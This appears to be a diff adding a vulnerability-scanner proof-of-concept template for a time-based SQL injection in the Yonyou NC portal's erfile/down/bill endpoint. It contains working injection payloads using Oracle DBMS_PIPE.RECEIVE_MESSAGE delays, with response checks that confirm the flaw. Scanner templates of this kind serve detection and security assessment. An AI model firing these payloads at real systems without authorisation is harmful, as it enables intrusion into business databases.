@@ -1,0 +1,20 @@
+name: poc-yaml-yongyouNC-down_bill-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /portal/pt/erfile/down/bill?pageId=login&id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),3)--
+    expression: response.status == 500 && response.latency >= 3000 && response.latency <= 4000
+  r1:
+    request:
+      method: GET
+      path: /portal/pt/erfile/down/bill?pageId=login&id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),6)--
+    expression: response.status == 500 && response.latency >= 6000 && response.latency <= 7000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139903114
